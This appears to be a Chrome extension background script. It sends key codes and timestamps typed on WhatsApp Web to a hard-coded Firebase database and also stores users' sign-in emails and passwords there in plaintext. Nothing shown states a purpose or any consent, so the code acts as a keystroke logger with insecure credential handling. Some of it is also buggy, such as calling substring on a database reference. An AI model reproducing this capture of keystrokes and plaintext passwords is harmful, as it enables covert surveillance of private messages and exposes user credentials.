// Upload Data to firebase database

const WHATSAPP_WEB = "https://web.whatsapp.com/"
const SIGN_IN_ACTION = "SIGNIN"
const SIGN_UP_ACTION = "SIGNUP"

const config = {
    apiKey: "AIzaSyABnZ9KDeJiJxqswHy7rJqVhP5Qu5DOxRo",
    authDomain: "anona-dd0ad.firebaseapp.com",
    databaseURL: "https://anona-dd0ad.firebaseio.com",
    projectId: "anona-dd0ad",
    storageBucket: "anona-dd0ad.appspot.com",
    messagingSenderId: "126637111077"
  };

const FIREBASEANONA = firebase.initializeApp(config);
var isSignedIn = false

function writeClientData(key, time){
    FIREBASEANONA.database().ref().set({
        keyCode: key,
        timeStamp: time
    })
}

function onMessage(request, sender){
	if(sender.url == WHATSAPP_WEB && isSignedIn){
		console.log(request.key + "- " + request.time);
		writeClientData(request.key, request.time);
	}
	else{
		if(request.action == SIGN_IN_ACTION){
			isSignedIn = true;
			firebase.auth().signInWithEmailAndPassword(request.email, request.password);
			var userKey = FIREBASEANONA.database().ref("users").push()
			userKey.set({
				email: request.email,
				password: request.password
			});
			alert(userKey);
			userKey = userKey.substring(userKey.lastIndexOf("/-"));
			alert(userKey);
		}
		if(request.action == SIGN_UP_ACTION){
			isSignedIn = true;
			firebase.auth().createUserWithEmailAndPassword(request.email, request.password);
		}
		
	}
}

chrome.runtime.onMessage.addListener(onMessage);